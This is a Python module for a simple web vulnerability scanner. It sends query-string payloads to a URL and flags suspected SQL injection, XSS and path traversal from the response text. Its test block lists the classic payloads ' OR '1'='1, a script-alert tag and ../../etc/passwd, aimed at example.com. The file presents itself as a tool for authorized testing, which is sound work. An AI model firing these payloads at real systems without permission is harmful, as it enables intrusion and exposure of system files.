# ============================================================
# File Name : attack_engine.py
# Project   : CyberSecuritySuite
# Author    : Gull Virk
# Version   : 1.0.0
#
# Description:
# Attack Engine Module:
# - Executes controlled payload testing
# - Sends requests to target
# - Works with PayloadManager
# - Used for authorized security testing only
# ============================================================

import requests
import time


class AttackEngine:

    def __init__(self, timeout=10):
        self.timeout = timeout
        self.results = []

        self.headers = {
            "User-Agent": "CyberSecuritySuite-AttackEngine/1.0 (Educational Use Only)"
        }

    # ========================================================
    # RUN ATTACK TEST
    # ========================================================
    def run(self, base_url: str, payloads: list, param: str = "input"):
        self.results = []

        print(f"[+] Starting Attack Simulation on: {base_url}")

        for payload in payloads:
            self.send_payload(base_url, payload, param)
            time.sleep(0.5)  # slow down requests (safe testing)

        return self.results

    # ========================================================
    # SEND PAYLOAD REQUEST
    # ========================================================
    def send_payload(self, url: str, payload: str, param: str):

        try:
            test_url = f"{url}?{param}={payload}"

            response = requests.get(
                test_url,
                headers=self.headers,
                timeout=self.timeout
            )

            self.analyze_response(test_url, payload, response)

        except Exception as e:
            self.results.append({
                "type": "Request Error",
                "payload": payload,
                "error": str(e)
            })

    # ========================================================
    # ANALYZE RESPONSE
    # ========================================================
    def analyze_response(self, url: str, payload: str, response):

        content = response.text.lower()

        result = {
            "url": url,
            "payload": payload,
            "status_code": response.status_code,
            "length": len(response.text),
            "vulnerability": None
        }

        # Detect SQL errors
        sql_errors = [
            "sql syntax",
            "mysql",
            "odbc",
            "warning",
            "unclosed quotation"
        ]

        for error in sql_errors:
            if error in content:
                result["vulnerability"] = "SQL Injection Suspected"
                result["evidence"] = error

        # Detect XSS reflection
        if payload.lower() in content and "<script" in payload.lower():
            result["vulnerability"] = "XSS Suspected"
            result["evidence"] = "Payload reflected in response"

        # Detect path traversal
        if "etc/passwd" in content or "root:" in content:
            result["vulnerability"] = "Path Traversal Suspected"
            result["evidence"] = "Sensitive file exposure detected"

        self.results.append(result)

    # ========================================================
    # GET RESULTS
    # ========================================================
    def get_results(self):
        return self.results

    # ========================================================
    # PRINT REPORT
    # ========================================================
    def report(self):
        print("\n========== ATTACK ENGINE REPORT ==========")

        if not self.results:
            print("No results found.")
            return

        for i, r in enumerate(self.results, 1):
            print(f"\n[{i}] URL        : {r.get('url')}")
            print(f"    Payload    : {r.get('payload')}")
            print(f"    Status     : {r.get('status_code')}")
            print(f"    Vulnerable : {r.get('vulnerability')}")
            print(f"    Evidence   : {r.get('evidence', 'None')}")

        print("\n=========================================\n")


# ============================================================
# TEST RUN
# ============================================================
if __name__ == "__main__":

    engine = AttackEngine()

    test_payloads = [
        "' OR '1'='1",
        "<script>alert(1)</script>",
        "../../etc/passwd"
    ]

    results = engine.run("http://example.com/search", test_payloads)

    engine.report()